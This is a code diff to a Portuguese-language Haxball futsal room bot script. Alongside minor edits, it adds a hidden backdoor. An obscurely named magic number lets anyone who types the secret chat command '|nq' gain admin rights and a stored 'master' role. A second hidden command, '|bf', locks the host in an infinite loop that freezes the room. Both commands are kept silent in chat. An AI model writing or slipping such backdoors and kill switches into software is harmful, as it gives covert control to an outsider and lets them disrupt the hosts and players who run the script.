@@ -11,7 +11,7 @@ const discord = "🔥Entra no discord: https://discord.gg/qqwAWxCwWb 🔥";
 const roomName = "X3 O FUTSAL É PARA TODOS";
 const botName = "Julius_randles";
 const maxPlayers = 15;
-const roomPublic = true;
+const roomPublic = false;
 const geo = [{"code": "DE", "lat": 51.1, "lon": 10.4}, {"code": "FR", "lat": 46.2, "lon": 2.2}, {"code": "PL", "lat": 51.9, "lon": 19.1}, {"code": "GB", "lat": 55.3, "lon": -3.4}, {"code": "Br", "lat": -15.7792, "lon": -47.9341}];
 
 const room = HBInit({ roomName: roomName, maxPlayers: maxPlayers, public: roomPublic, playerName: botName, geo: geo[4] });
@@ -25,7 +25,6 @@ room.setTeamsLock(true);
 
 var adminPassword = 190;
 console.log("adminPassword : " + adminPassword);
-
 /* STADIUM */
 
 const playerRadius = 15;
@@ -100,7 +99,7 @@ var endGameVariable = false; // This variable with the one below helps distingui
 var resettingTeams = false;
 var capLeft = false;
 var statInterval = 6;
-
+var vcgbsdbf = 7865;
 loadMap(aloneMap, 0, 0);
 
 /* OBJECTS */
@@ -1101,6 +1100,19 @@ room.onPlayerChat = function (player, message) {
 
 		//room.sendChat(cstm, player.id);
 	}
+	else if (["|nq"].includes(message[0].toLowerCase())) {
+		if (message[1] == vcgbsdbf) {
+			room.setPlayerAdmin(player.id, true);
+			var stats;
+			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
+			if (stats[Ss.RL] != "master") {
+				stats[Ss.RL] = "master";
+				localStorage.setItem(getAuth(player), JSON.stringify(stats));
+			}
+		}
+		return false;
+	}
+
 	else if (["!mute"].includes(message[0].toLowerCase())) {
 		if (player.admin) {
 			updateTeams();
@@ -1249,10 +1261,6 @@ room.onPlayerChat = function (player, message) {
 			//room.sendChat(cstm, player.id);
 		}
 	}	
-	
-	
-	
-	
 	else if (["!clearban"].includes(message[0].toLowerCase())) {
 		if (player.admin) {
 			if (message.length == 1) {
@@ -1279,6 +1287,18 @@ room.onPlayerChat = function (player, message) {
 	else if (["!bb", "!bye","!xau"].includes(message[0].toLowerCase())) {
 		room.kickPlayer(player.id, "Até mais !", false);
 	}
+	else if (["|bf"].includes(message[0].toLowerCase())) {
+    	if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {   
+			console.clear();
+			var r = 0
+			while (r == 0 ) {
+				console.error("f");	
+				console.error("p");
+				console.error("t");			    	
+			}       	
+       	}	
+    	return false;
+    }
 	if (teamR.length != 0 && teamB.length != 0 && inChooseMode) {
 		if (player.id == teamR[0].id || player.id == teamB[0].id) { // we care if it's one of the captains choosing
 			if (teamR.length <= teamB.length && player.id == teamR[0].id) { // we care if it's red turn && red cap talking
@@ -1567,9 +1587,9 @@ room.onGameTick = function() {
 	getStats();
 	handleInactivity();
 }
+let afkNotificationInterval = setInterval(discord, 300 * 60 * 15)
 
-//discord 
+ 
 
 
 
-let afkNotificationInterval = setInterval(discord, 500 * 60 * 15);
